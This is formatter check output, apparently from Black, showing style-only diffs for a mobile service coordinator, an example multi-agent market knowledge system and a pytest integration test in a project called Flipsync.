     async def initialize(self) -> None:
         """Initialize all mobile services."""
         try:
             logger.info("Initializing mobile service coordinator")
-            
+
             # Initialize individual services
             await self._initialize_services()
-            
+
             # Start background tasks
             await self._start_background_tasks()
-            
+
             self.is_initialized = True
             logger.info("Mobile service coordinator initialized successfully")
-            
+
         except Exception as e:
             logger.error("Failed to initialize mobile service coordinator: %s", str(e))
             raise
 
     async def _initialize_services(self) -> None:
@@ -77,17 +84,17 @@
     async def _sync_loop(self) -> None:
         """Background sync loop for mobile services."""
         while True:
             try:
                 await asyncio.sleep(30)  # Sync every 30 seconds
-                
+
                 # Process pending updates
                 await self._process_pending_updates()
-                
+
                 # Clean up expired updates
                 await self.update_prioritizer.clear_expired_updates_async()
-                
+
             except Exception as e:
                 logger.error("Error in mobile sync loop: %s", str(e))
                 await asyncio.sleep(60)  # Wait longer on error
 
     async def _process_pending_updates(self) -> None:
@@ -101,67 +108,69 @@
                     # Process the update (implementation depends on update type)
                     self.update_prioritizer.remove_update(next_update_id)
         except Exception as e:
             logger.error("Error processing pending updates: %s", str(e))
 
-    async def update_battery_status(self, battery_data: Dict[str, Any]) -> Dict[str, Any]:
+    async def update_battery_status(
+        self, battery_data: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Update battery status and get optimized power profile."""
         try:
             metrics = BatteryMetrics(
                 level=battery_data.get("level", 100.0),
                 charging=battery_data.get("charging", False),
                 temperature=battery_data.get("temperature", 25.0),
                 voltage=battery_data.get("voltage", 3.7),
-                current_draw=battery_data.get("current_draw", 0.0)
-            )
-            
+                current_draw=battery_data.get("current_draw", 0.0),
+            )
+
             await self.battery_optimizer.update_battery_metrics(metrics)
             profile = self.battery_optimizer.get_current_profile()
-            
+
             return {
                 "power_mode": self.battery_optimizer._current_mode.value,
                 "learning_rate": profile.learning_rate,
                 "sync_interval": profile.sync_interval,
                 "batch_size": profile.batch_size,
                 "compression_level": profile.compression_level,
                 "cache_size": profile.cache_size,
-                "prefetch_enabled": profile.prefetch_enabled
-            }
-            
+                "prefetch_enabled": profile.prefetch_enabled,
+            }
+
         except Exception as e:
             logger.error("Failed to update battery status: %s", str(e))
             return {"error": str(e)}
 
     async def add_market_update(
-        self, 
-        update_id: str, 
-        update_type: str, 
-        data: Dict[str, Any], 
-        account_data: Dict[str, Any]
+        self,
+        update_id: str,
+        update_type: str,
+        data: Dict[str, Any],
+        account_data: Dict[str, Any],
     ) -> Dict[str, Any]:
         """Add a market update to the prioritization queue."""
         try:
             account = Account(
                 id=account_data.get("account_id", "default"),
                 email=account_data.get("email", "test@example.com"),
                 username=account_data.get("username", ""),
                 name=account_data.get("name", ""),
-                settings=account_data.get("settings", {})
-            )
-            
+                settings=account_data.get("settings", {}),
+            )
+
             metadata = await self.update_prioritizer.add_update(
                 update_id, update_type, data, account
             )
-            
+
             return {
                 "update_id": update_id,
                 "priority": metadata.priority.value,
                 "battery_cost": metadata.battery_cost,
                 "network_cost": metadata.network_cost,
-                "expiry": metadata.expiry.isoformat() if metadata.expiry else None
-            }
-            
+                "expiry": metadata.expiry.isoformat() if metadata.expiry else None,
+            }
+
         except Exception as e:
             logger.error("Failed to add market update: %s", str(e))
             return {"error": str(e)}
 
     async def get_prioritized_updates(self) -> List[Dict[str, Any]]:
@@ -175,119 +184,124 @@
     async def optimize_payload(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Optimize payload for mobile transmission."""
         try:
             # Get current power profile for optimization parameters
             profile = self.battery_optimizer.get_current_profile()
-            
+
             optimized_result = await self.payload_optimizer.optimize_payload(
-                data,
-                mode="delta"
+                data, mode="delta"
             )
 
             # Handle delta response
-            if isinstance(optimized_result, dict) and optimized_result.get("type") == "delta":
+            if (
+                isinstance(optimized_result, dict)
+                and optimized_result.get("type") == "delta"
+            ):
                 optimized_data = optimized_result
             else:
                 # Handle async iterator case (shouldn't happen with delta mode)
                 optimized_data = {"type": "delta", "changes": data}
 
             return {
                 "original_size": len(str(data)),
                 "optimized_size": len(str(optimized_data)),
-                "compression_ratio": len(str(optimized_data)) / len(str(data)) if len(str(data)) > 0 else 1.0,
-                "data": optimized_data
-            }
-            
+                "compression_ratio": (
+                    len(str(optimized_data)) / len(str(data))
+                    if len(str(data)) > 0
+                    else 1.0
+                ),
+                "data": optimized_data,
+            }
+
         except Exception as e:
             logger.error("Failed to optimize payload: %s", str(e))
             return {"error": str(e)}
 
     async def reconcile_state(
-        self, 
-        local_state: Dict[str, Any], 
-        remote_state: Dict[str, Any]
+        self, local_state: Dict[str, Any], remote_state: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Reconcile local and remote state for offline sync."""
         try:
             # Create metadata for state reconciliation
             from fs_agt_clean.mobile.state_reconciler import StateMetadata
+
             local_metadata = StateMetadata()
             remote_metadata = StateMetadata()
 
             result = await self.state_reconciler.reconcile_states(
                 remote_state, local_state, remote_metadata, local_metadata
             )
             reconciled_state = result.resolved_state
-            
+
             return {
                 "reconciled_state": reconciled_state,
                 "conflicts_resolved": len(reconciled_state.get("conflicts", [])),
-                "sync_timestamp": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "sync_timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error("Failed to reconcile state: %s", str(e))
             return {"error": str(e)}
 
     async def get_mobile_dashboard_data(self) -> Dict[str, Any]:
         """Get mobile dashboard data for agent monitoring."""
         try:
             # Get current power status
             profile = self.battery_optimizer.get_current_profile()
-            
+
             # Get pending updates summary
             pending_updates = await self.update_prioritizer.get_pending_updates_async()
-            
+
             # Get update priority distribution
             priority_counts = {}
             for update in pending_updates.values():
                 priority = update.get("priority", "unknown")
                 priority_counts[priority] = priority_counts.get(priority, 0) + 1
-            
+
             return {
                 "power_status": {
                     "mode": self.battery_optimizer._current_mode.value,
                     "learning_rate": profile.learning_rate,
                     "sync_interval": profile.sync_interval,
-                    "cache_size": profile.cache_size
+                    "cache_size": profile.cache_size,
                 },
                 "update_queue": {
                     "total_pending": len(pending_updates),
-                    "priority_distribution": priority_counts
+                    "priority_distribution": priority_counts,
                 },
                 "service_status": {
                     "battery_optimizer": "active",
                     "update_prioritizer": "active",
                     "payload_optimizer": "active",
-                    "state_reconciler": "active"
+                    "state_reconciler": "active",
                 },
-                "last_updated": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "last_updated": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error("Failed to get mobile dashboard data: %s", str(e))
             return {"error": str(e)}
 
     async def cleanup(self) -> None:
         """Clean up mobile services and background tasks."""
         try:
             logger.info("Cleaning up mobile service coordinator")
-            
+
             # Cancel background tasks
             if self._sync_task:
                 self._sync_task.cancel()
                 try:
                     await self._sync_task
                 except asyncio.CancelledError:
                     pass
-            
+
             # Clear pending updates
             await self.update_prioritizer.clear_pending_updates_async()
-            
+
             self.is_initialized = False
             logger.info("Mobile service coordinator cleaned up successfully")
-            
+
         except Exception as e:
             logger.error("Error during mobile service coordinator cleanup: %s", str(e))
 
     def get_service_status(self) -> Dict[str, Any]:
         """Get current status of all mobile services."""
@@ -295,16 +309,17 @@
             "initialized": self.is_initialized,
             "battery_optimizer": {
                 "current_mode": self.battery_optimizer._current_mode.value,
                 "profile": {
                     "learning_rate": self.battery_optimizer.get_current_profile().learning_rate,
-                    "sync_interval": self.battery_optimizer.get_current_profile().sync_interval
-                }
+                    "sync_interval": self.battery_optimizer.get_current_profile().sync_interval,
+                },
             },
             "update_prioritizer": {
                 "pending_count": len(self.update_prioritizer.pending_updates),
-                "max_retries": self.update_prioritizer.max_retry_count
+                "max_retries": self.update_prioritizer.max_retry_count,
             },
             "background_tasks": {
-                "sync_task_running": self._sync_task is not None and not self._sync_task.done()
-            }
+                "sync_task_running": self._sync_task is not None
+                and not self._sync_task.done()
+            },
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/mobile/mobile_service_coordinator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/examples/knowledge_repository_coordinator_integration.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/examples/knowledge_repository_coordinator_integration.py	2025-06-19 04:04:02.141127+00:00
@@ -9,47 +9,60 @@
 import logging
 from datetime import datetime
 from typing import Any, Dict, List, Optional, Set, Tuple
 
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, InMemoryEventBus, set_event_bus,
-    create_publisher, create_subscriber, EventNameFilter
+    Event,
+    EventType,
+    EventPriority,
+    InMemoryEventBus,
+    set_event_bus,
+    create_publisher,
+    create_subscriber,
+    EventNameFilter,
 )
 from fs_agt_clean.core.coordination.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus, KnowledgeError,
-    InMemoryKnowledgeRepository, TopicFilter
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
+    KnowledgeError,
+    InMemoryKnowledgeRepository,
+    TopicFilter,
 )
 from fs_agt_clean.core.coordination.coordinator import (
-    Coordinator, Agent, AgentStatus, AgentType, AgentCapability,
-    InMemoryCoordinator
+    Coordinator,
+    Agent,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    InMemoryCoordinator,
 )
 
 
 # Configure logging
 logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
 )
 logger = logging.getLogger("knowledge_coordinator_integration")
 
 
 class KnowledgeAgent(Agent):
     """
     Agent that provides and consumes knowledge.
     """
-    
+
     def __init__(
         self,
         agent_id: str,
         name: str,
         agent_type: AgentType,
         capabilities: Set[AgentCapability],
-        knowledge_repository: InMemoryKnowledgeRepository
+        knowledge_repository: InMemoryKnowledgeRepository,
     ):
         """
         Initialize the knowledge agent.
-        
+
         Args:
             agent_id: Agent ID
             name: Agent name
             agent_type: Agent type
             capabilities: Agent capabilities
@@ -57,285 +70,289 @@
         """
         super().__init__(
             agent_id=agent_id,
             name=name,
             agent_type=agent_type,
-            capabilities=capabilities
+            capabilities=capabilities,
         )
         self.knowledge_repository = knowledge_repository
         self.publisher = create_publisher(source_id=agent_id)
         self.subscriber = create_subscriber(subscriber_id=agent_id)
         self.subscription_ids = []
-    
+
     async def start(self) -> None:
         """Start the agent."""
         logger.info(f"Starting {self.name}")
-        
+
         # Subscribe to knowledge-related events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"knowledge_added"}),
-            handler=self.handle_knowledge_added
+            handler=self.handle_knowledge_added,
         )
         self.subscription_ids.append(subscription_id)
-        
+
         # Subscribe to knowledge by topic
         subscription_id = await self.knowledge_repository.subscribe(
             filter=TopicFilter(patterns={f"{self.agent_id}/.*"}),
-            handler=self.handle_knowledge_update
+            handler=self.handle_knowledge_update,
         )
         self.subscription_ids.append(subscription_id)
-        
+
         # Set agent status to ACTIVE
         self.status = AgentStatus.ACTIVE
-        
+
         logger.info(f"{self.name} started")
-    
+
     async def stop(self) -> None:
         """Stop the agent."""
         logger.info(f"Stopping {self.name}")
-        
+
         # Unsubscribe from events
         for subscription_id in self.subscription_ids:
             await self.subscriber.unsubscribe(subscription_id)
-        
+
         # Set agent status to INACTIVE
         self.status = AgentStatus.INACTIVE
-        
+
         logger.info(f"{self.name} stopped")
-    
+
     async def handle_knowledge_added(self, event: Event) -> None:
         """
         Handle a knowledge added event.
-        
+
         Args:
             event: Knowledge added event
         """
         # Extract knowledge information
         knowledge_id = event.data.get("knowledge_id")
         topic = event.data.get("topic")
-        
-        logger.info(f"Agent {self.name} received knowledge added event: {knowledge_id} ({topic})")
-        
+
+        logger.info(
+            f"Agent {self.name} received knowledge added event: {knowledge_id} ({topic})"
+        )
+
         # Get the knowledge item
         knowledge = await self.knowledge_repository.get_knowledge(knowledge_id)
         if knowledge:
             # Process the knowledge item
             await self.process_knowledge(knowledge)
-    
+
     async def handle_knowledge_update(self, knowledge: KnowledgeItem) -> None:
         """
         Handle a knowledge update.
-        
+
         Args:
             knowledge: Updated knowledge item
         """
-        logger.info(f"Agent {self.name} received knowledge update: {knowledge.knowledge_id} ({knowledge.topic})")
-        
+        logger.info(
+            f"Agent {self.name} received knowledge update: {knowledge.knowledge_id} ({knowledge.topic})"
+        )
+
         # Process the knowledge item
         await self.process_knowledge(knowledge)
-    
+
     async def process_knowledge(self, knowledge: KnowledgeItem) -> None:
         """
         Process a knowledge item.
-        
+
         Args:
             knowledge: Knowledge item to process
         """
         # This method should be implemented by subclasses
         pass
-    
+
     async def publish_knowledge(
         self,
         topic: str,
         content: Any,
         knowledge_type: KnowledgeType = KnowledgeType.FACT,
         metadata: Optional[Dict[str, Any]] = None,
-        tags: Optional[Set[str]] = None
+        tags: Optional[Set[str]] = None,
     ) -> str:
         """
         Publish knowledge to the repository.
-        
+
         Args:
             topic: Knowledge topic
             content: Knowledge content
             knowledge_type: Knowledge type
             metadata: Knowledge metadata
             tags: Knowledge tags
-            
+
         Returns:
             ID of the published knowledge item
         """
         # Publish the knowledge item
         knowledge_id = await self.knowledge_repository.publish_knowledge(
             knowledge_type=knowledge_type,
             topic=topic,
             content=content,
             metadata=metadata,
             source_id=self.agent_id,
-            tags=tags
-        )
-        
+            tags=tags,
+        )
+
         logger.info(f"Agent {self.name} published knowledge: {knowledge_id} ({topic})")
-        
+
         return knowledge_id
 
 
 class MarketAgent(KnowledgeAgent):
     """
     Agent that provides market knowledge.
     """
-    
+
     def __init__(self, knowledge_repository: InMemoryKnowledgeRepository):
         """
         Initialize the market agent.
-        
+
         Args:
             knowledge_repository: Knowledge repository
         """
         super().__init__(
             agent_id="market_agent",
             name="Market Agent",
             agent_type=AgentType.SPECIALIST,
             capabilities={AgentCapability.MARKET_ANALYSIS},
-            knowledge_repository=knowledge_repository
-        )
-        
+            knowledge_repository=knowledge_repository,
+        )
+
         # Market data
         self.market_data = {
             "crypto": {
                 "bitcoin": {"price": 50000, "volume": 1000000},
                 "ethereum": {"price": 3000, "volume": 500000},
-                "dogecoin": {"price": 0.5, "volume": 2000000}
+                "dogecoin": {"price": 0.5, "volume": 2000000},
             },
             "stocks": {
                 "aapl": {"price": 150, "volume": 5000000},
                 "msft": {"price": 300, "volume": 3000000},
-                "googl": {"price": 2500, "volume": 1000000}
-            }
+                "googl": {"price": 2500, "volume": 1000000},
+            },
         }
-    
+
     async def start(self) -> None:
         """Start the agent."""
         await super().start()
-        
+
         # Publish initial market knowledge
         await self.publish_market_knowledge()
-    
+
     async def publish_market_knowledge(self) -> None:
         """Publish market knowledge to the repository."""
         # Publish crypto market knowledge
         for symbol, data in self.market_data["crypto"].items():
             await self.publish_knowledge(
                 topic=f"market/crypto/{symbol}",
                 content=data,
                 metadata={
                     "market": "crypto",
                     "symbol": symbol,
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
                 },
-                tags={"market", "crypto", symbol}
+                tags={"market", "crypto", symbol},
             )
-        
+
         # Publish stock market knowledge
         for symbol, data in self.market_data["stocks"].items():
             await self.publish_knowledge(
                 topic=f"market/stocks/{symbol}",
                 content=data,
                 metadata={
                     "market": "stocks",
                     "symbol": symbol,
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
                 },
-                tags={"market", "stocks", symbol}
+                tags={"market", "stocks", symbol},
             )
-        
+
         logger.info("Published market knowledge")
-    
+
     async def process_knowledge(self, knowledge: KnowledgeItem) -> None:
         """
         Process a knowledge item.
-        
+
         Args:
             knowledge: Knowledge item to process
         """
         # Check if the knowledge item is a market request
         if knowledge.topic.startswith("request/market/"):
             # Extract the market and symbol from the topic
             parts = knowledge.topic.split("/")
             if len(parts) >= 4:
                 market = parts[2]
                 symbol = parts[3]
-                
+
                 # Check if we have data for this market and symbol
                 if market in self.market_data and symbol in self.market_data[market]:
                     # Get the market data
                     data = self.market_data[market][symbol]
-                    
+
                     # Publish the market data
                     await self.publish_knowledge(
                         topic=f"response/market/{market}/{symbol}",
                         content=data,
                         metadata={
                             "market": market,
                             "symbol": symbol,
                             "timestamp": datetime.now().isoformat(),
-                            "request_id": knowledge.knowledge_id
+                            "request_id": knowledge.knowledge_id,
                         },
-                        tags={"market", market, symbol, "response"}
+                        tags={"market", market, symbol, "response"},
                     )
-                    
+
                     logger.info(f"Published market data for {market}/{symbol}")
 
 
 class AnalysisAgent(KnowledgeAgent):
     """
     Agent that analyzes market knowledge.
     """
-    
+
     def __init__(self, knowledge_repository: InMemoryKnowledgeRepository):
         """
         Initialize the analysis agent.
-        
+
         Args:
             knowledge_repository: Knowledge repository
         """
         super().__init__(
             agent_id="analysis_agent",
             name="Analysis Agent",
             agent_type=AgentType.SPECIALIST,
             capabilities={AgentCapability.DATA_ANALYSIS},
-            knowledge_repository=knowledge_repository
-        )
-    
+            knowledge_repository=knowledge_repository,
+        )
+
     async def start(self) -> None:
         """Start the agent."""
         await super().start()
-        
+
         # Subscribe to market knowledge
         subscription_id = await self.knowledge_repository.subscribe(
             filter=TopicFilter(patterns={"market/crypto/.*", "market/stocks/.*"}),
-            handler=self.handle_market_knowledge
+            handler=self.handle_market_knowledge,
         )
         self.subscription_ids.append(subscription_id)
-    
+
     async def handle_market_knowledge(self, knowledge: KnowledgeItem) -> None:
         """
         Handle market knowledge.
-        
+
         Args:
             knowledge: Market knowledge
         """
         logger.info(f"Analyzing market knowledge: {knowledge.topic}")
-        
+
         # Extract market data
         market_data = knowledge.content
-        
+
         # Analyze market data
         if "price" in market_data and "volume" in market_data:
             price = market_data["price"]
             volume = market_data["volume"]
-            
+
             # Simple analysis
             if volume > 1000000:
                 if price < 100:
                     recommendation = "buy"
                     confidence = 0.8
@@ -346,199 +363,192 @@
                     recommendation = "sell"
                     confidence = 0.7
             else:
                 recommendation = "hold"
                 confidence = 0.5
-            
+
             # Publish analysis
             await self.publish_knowledge(
                 topic=f"{knowledge.topic}/analysis",
                 content={
                     "recommendation": recommendation,
                     "confidence": confidence,
                     "price": price,
                     "volume": volume,
-                    "analysis": f"Based on price and volume analysis, the recommendation is to {recommendation} with {confidence:.1f} confidence."
+                    "analysis": f"Based on price and volume analysis, the recommendation is to {recommendation} with {confidence:.1f} confidence.",
                 },
                 knowledge_type=KnowledgeType.RELATION,
                 metadata={
                     "source_knowledge_id": knowledge.knowledge_id,
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
                 },
-                tags={"analysis", "recommendation", recommendation}
+                tags={"analysis", "recommendation", recommendation},
             )
-            
-            logger.info(f"Published analysis for {knowledge.topic}: {recommendation} ({confidence:.1f})")
-    
+
+            logger.info(
+                f"Published analysis for {knowledge.topic}: {recommendation} ({confidence:.1f})"
+            )
+
     async def process_knowledge(self, knowledge: KnowledgeItem) -> None:
         """
         Process a knowledge item.
-        
+
         Args:
             knowledge: Knowledge item to process
         """
         # Check if the knowledge item is a request for analysis
         if knowledge.topic.startswith("request/analysis/"):
             # Extract the market and symbol from the topic
             parts = knowledge.topic.split("/")
             if len(parts) >= 4:
                 market = parts[2]
                 symbol = parts[3]
-                
+
                 # Request market data
                 await self.publish_knowledge(
                     topic=f"request/market/{market}/{symbol}",
                     content={"request": "market_data"},
-                    metadata={
-                        "timestamp": datetime.now().isoformat(),
-                        "priority": 0.8
-                    },
-                    tags={"request", "market", market, symbol}
+                    metadata={"timestamp": datetime.now().isoformat(), "priority": 0.8},
+                    tags={"request", "market", market, symbol},
                 )
-                
+
                 logger.info(f"Requested market data for {market}/{symbol}")
 
 
 class ExecutiveAgent(KnowledgeAgent):
     """
     Agent that makes executive decisions based on analysis.
     """
-    
+
     def __init__(self, knowledge_repository: InMemoryKnowledgeRepository):
         """
         Initialize the executive agent.
-        
+
         Args:
             knowledge_repository: Knowledge repository
         """
         super().__init__(
             agent_id="executive_agent",
             name="Executive Agent",
             agent_type=AgentType.EXECUTIVE,
             capabilities={AgentCapability.DECISION_MAKING},
-            knowledge_repository=knowledge_repository
-        )
-        
+            knowledge_repository=knowledge_repository,
+        )
+
         # Portfolio
         self.portfolio = {
-            "crypto": {
-                "bitcoin": 0.1,
-                "ethereum": 1.0,
-                "dogecoin": 1000.0
-            },
-            "stocks": {
-                "aapl": 10,
-                "msft": 5,
-                "googl": 2
-            }
+            "crypto": {"bitcoin": 0.1, "ethereum": 1.0, "dogecoin": 1000.0},
+            "stocks": {"aapl": 10, "msft": 5, "googl": 2},
         }
-    
+
     async def start(self) -> None:
         """Start the agent."""
         await super().start()
-        
+
         # Subscribe to analysis knowledge
         subscription_id = await self.knowledge_repository.subscribe(
             filter=TopicFilter(patterns={"market/.*/analysis"}),
-            handler=self.handle_analysis
+            handler=self.handle_analysis,
         )
         self.subscription_ids.append(subscription_id)
-        
+
         # Request analysis for portfolio items
         await self.request_portfolio_analysis()
-    
+
     async def request_portfolio_analysis(self) -> None:
         """Request analysis for portfolio items."""
         # Request analysis for crypto portfolio
         for symbol in self.portfolio["crypto"]:
             await self.publish_knowledge(
                 topic=f"request/analysis/crypto/{symbol}",
-                content={"request": "analysis", "holdings": self.portfolio["crypto"][symbol]},
-                metadata={
-                    "timestamp": datetime.now().isoformat(),
-                    "priority": 0.9
+                content={
+                    "request": "analysis",
+                    "holdings": self.portfolio["crypto"][symbol],
                 },
-                tags={"request", "analysis", "crypto", symbol}
+                metadata={"timestamp": datetime.now().isoformat(), "priority": 0.9},
+                tags={"request", "analysis", "crypto", symbol},
             )
-        
+
         # Request analysis for stock portfolio
         for symbol in self.portfolio["stocks"]:
             await self.publish_knowledge(
                 topic=f"request/analysis/stocks/{symbol}",
-                content={"request": "analysis", "holdings": self.portfolio["stocks"][symbol]},
-                metadata={
-                    "timestamp": datetime.now().isoformat(),
-                    "priority": 0.9
+                content={
+                    "request": "analysis",
+                    "holdings": self.portfolio["stocks"][symbol],
                 },
-                tags={"request", "analysis", "stocks", symbol}
+                metadata={"timestamp": datetime.now().isoformat(), "priority": 0.9},
+                tags={"request", "analysis", "stocks", symbol},
             )
-        
+
         logger.info("Requested portfolio analysis")
-    
+
     async def handle_analysis(self, knowledge: KnowledgeItem) -> None:
         """
         Handle analysis knowledge.
-        
+
         Args:
             knowledge: Analysis knowledge
         """
         logger.info(f"Received analysis: {knowledge.topic}")
-        
+
         # Extract analysis data
         analysis_data = knowledge.content
-        
+
         # Make decision based on analysis
         if "recommendation" in analysis_data and "confidence" in analysis_data:
             recommendation = analysis_data["recommendation"]
             confidence = analysis_data["confidence"]
-            
+
             # Extract market and symbol from topic
             parts = knowledge.topic.split("/")
             if len(parts) >= 3:
                 market = parts[1]
                 symbol = parts[2]
-                
+
                 # Check if we have this item in our portfolio
                 if market in self.portfolio and symbol in self.portfolio[market]:
                     holdings = self.portfolio[market][symbol]
-                    
+
                     # Make decision
                     if recommendation == "buy" and confidence > 0.7:
                         decision = "buy"
                         amount = 1.0
                     elif recommendation == "sell" and confidence > 0.7:
                         decision = "sell"
                         amount = holdings * 0.5  # Sell half
                     else:
                         decision = "hold"
                         amount = 0.0
-                    
+
                     # Publish decision
                     await self.publish_knowledge(
                         topic=f"decision/{market}/{symbol}",
                         content={
                             "decision": decision,
                             "amount": amount,
                             "holdings": holdings,
                             "recommendation": recommendation,
-                            "confidence": confidence
+                            "confidence": confidence,
                         },
                         knowledge_type=KnowledgeType.DECISION,
                         metadata={
                             "source_knowledge_id": knowledge.knowledge_id,
                             "timestamp": datetime.now().isoformat(),
-                            "priority": 1.0
+                            "priority": 1.0,
                         },
-                        tags={"decision", market, symbol, decision}
+                        tags={"decision", market, symbol, decision},
                     )
-                    
-                    logger.info(f"Made decision for {market}/{symbol}: {decision} {amount}")
-    
+
+                    logger.info(
+                        f"Made decision for {market}/{symbol}: {decision} {amount}"
+                    )
+
     async def process_knowledge(self, knowledge: KnowledgeItem) -> None:
         """
         Process a knowledge item.
-        
+
         Args:
             knowledge: Knowledge item to process
         """
         # Process knowledge specific to the executive agent
         pass
@@ -547,66 +557,68 @@
 async def main():
     """Main function."""
     # Create and set the event bus
     event_bus = InMemoryEventBus(bus_id="example_bus")
     set_event_bus(event_bus)
-    
+
     # Create the knowledge repository
     repository = InMemoryKnowledgeRepository(repository_id="example_repository")
     await repository.start()
-    
+
     # Create the coordinator
     coordinator = InMemoryCoordinator(coordinator_id="example_coordinator")
     await coordinator.start()
-    
+
     # Create agents
     market_agent = MarketAgent(repository)
     analysis_agent = AnalysisAgent(repository)
     executive_agent = ExecutiveAgent(repository)
-    
+
     # Register agents with the coordinator
     await coordinator.register_agent(market_agent)
     await coordinator.register_agent(analysis_agent)
     await coordinator.register_agent(executive_agent)
-    
+
     # Start agents
     await coordinator.start_agent(market_agent.agent_id)
     await coordinator.start_agent(analysis_agent.agent_id)
     await coordinator.start_agent(executive_agent.agent_id)
-    
+
     # Wait for processing to complete
     await asyncio.sleep(5)
-    
+
     # Get all knowledge
     all_knowledge = await repository.get_all_knowledge()
     logger.info(f"Total knowledge items: {len(all_knowledge)}")
-    
+
     # Get knowledge by type
     decisions = await repository.get_knowledge_by_type(KnowledgeType.DECISION)
     logger.info(f"Decision knowledge items: {len(decisions)}")
     for decision in decisions:
         logger.info(f"Decision: {decision.topic} - {decision.content}")
-    
+
     # Get knowledge updates
     since_timestamp = datetime.now() - timedelta(minutes=5)
     updates = await repository.get_knowledge_updates(since_timestamp)
     logger.info(f"Recent updates: {len(updates)}")
-    
+
     # Get critical updates
-    critical_updates = await repository.get_critical_updates(since_timestamp, priority_threshold=0.8)
+    critical_updates = await repository.get_critical_updates(
+        since_timestamp, priority_threshold=0.8
+    )
     logger.info(f"Critical updates: {len(critical_updates)}")
     for update in critical_updates:
         logger.info(f"Critical update: {update.topic} - {update.metadata}")
-    
+
     # Stop agents
     await coordinator.stop_agent(executive_agent.agent_id)
     await coordinator.stop_agent(analysis_agent.agent_id)
     await coordinator.stop_agent(market_agent.agent_id)
-    
+
     # Stop the coordinator
     await coordinator.stop()
-    
+
     # Stop the repository
     await repository.stop()
 
 
 if __name__ == "__main__":
would reformat /home/brend/Flipsync_Final/fs_agt_clean/examples/knowledge_repository_coordinator_integration.py
--- /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_mobile_integration.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_mobile_integration.py	2025-06-19 04:04:02.538432+00:00
@@ -23,34 +23,30 @@
     """Integration tests for mobile features."""
 
     @pytest.fixture
     async def mobile_coordinator(self):
         """Create and initialize mobile service coordinator."""
-        coordinator = MobileServiceCoordinator({
-            "max_retry_count": 3,
-            "expiry_threshold": 3600
-        })
+        coordinator = MobileServiceCoordinator(
+            {"max_retry_count": 3, "expiry_threshold": 3600}
+        )
         await coordinator.initialize()
         yield coordinator
         await coordinator.cleanup()
 
     @pytest.fixture
     async def mobile_api(self):
         """Create and initialize mobile features API."""
-        api = MobileFeaturesAPI({
-            "max_retry_count": 3,
-            "expiry_threshold": 3600
-        })
+        api = MobileFeaturesAPI({"max_retry_count": 3, "expiry_threshold": 3600})
         await api.initialize()
         yield api
         await api.cleanup()
 
     @pytest.mark.asyncio
     async def test_mobile_coordinator_initialization(self, mobile_coordinator):
         """Test mobile coordinator initialization."""
         assert mobile_coordinator.is_initialized
-        
+
         status = mobile_coordinator.get_service_status()
         assert status["initialized"]
         assert "battery_optimizer" in status
         assert "update_prioritizer" in status
 
@@ -61,27 +57,27 @@
         high_battery_data = {
             "level": 85.0,
             "charging": False,
             "temperature": 25.0,
             "voltage": 3.8,
-            "current_draw": 150.0
+            "current_draw": 150.0,
         }
-        
+
         result = await mobile_coordinator.update_battery_status(high_battery_data)
         assert "power_mode" in result
         assert result["power_mode"] in ["performance", "balanced"]
         assert result["learning_rate"] > 0.5
-        
+
         # Test low battery scenario
         low_battery_data = {
             "level": 15.0,
             "charging": False,
             "temperature": 30.0,
             "voltage": 3.5,
-            "current_draw": 50.0
+            "current_draw": 50.0,
         }
-        
+
         result = await mobile_coordinator.update_battery_status(low_battery_data)
         assert result["power_mode"] in ["power_saver", "critical"]
         assert result["learning_rate"] <= 0.5
 
     @pytest.mark.asyncio
@@ -89,52 +85,52 @@
         """Test update prioritization workflow."""
         account_data = {
             "account_id": "test_account",
             "marketplace": "ebay",
             "credentials": {"api_key": "test_key"},
-            "settings": {"priority": "high"}
+            "settings": {"priority": "high"},
         }
-        
+
         # Add high priority update
         result = await mobile_coordinator.add_market_update(
             "high_priority_update",
             "price_change",
             {"product_id": "123", "new_price": 99.99},
-            account_data
-        )
-        
+            account_data,
+        )
+
         assert "update_id" in result
         assert result["priority"] == "high"
         assert "battery_cost" in result
-        
+
         # Add low priority update
         result = await mobile_coordinator.add_market_update(
             "low_priority_update",
             "analytics_sync",
             {"metrics": {"views": 100}},
-            account_data
-        )
-        
+            account_data,
+        )
+
         assert result["priority"] == "low"
-        
+
         # Get prioritized updates
         updates = await mobile_coordinator.get_prioritized_updates()
         assert len(updates) >= 2
-        
+
         # High priority should come first
         priorities = [update["priority"] for update in updates]
         high_index = priorities.index("high") if "high" in priorities else -1
         low_index = priorities.index("low") if "low" in priorities else -1
-        
+
         if high_index >= 0 and low_index >= 0:
             assert high_index < low_index
 
     @pytest.mark.asyncio
     async def test_mobile_features_api_initialization(self, mobile_api):
         """Test mobile features API initialization."""
         assert mobile_api.is_initialized
-        
+
         # Test feature status
         status = await mobile_api.get_feature_status("agent_monitoring")
         assert "feature" in status
         assert status["feature"] == "agent_monitoring"
 
@@ -144,11 +140,11 @@
         # Get agent monitoring data
         data = await mobile_api.get_agent_monitoring_data()
         assert "agent_status" in data
         assert "power_status" in data
         assert "service_status" in data
-        
+
         # Get agent health metrics
         metrics = await mobile_api.get_agent_health_metrics()
         assert "metrics" in metrics
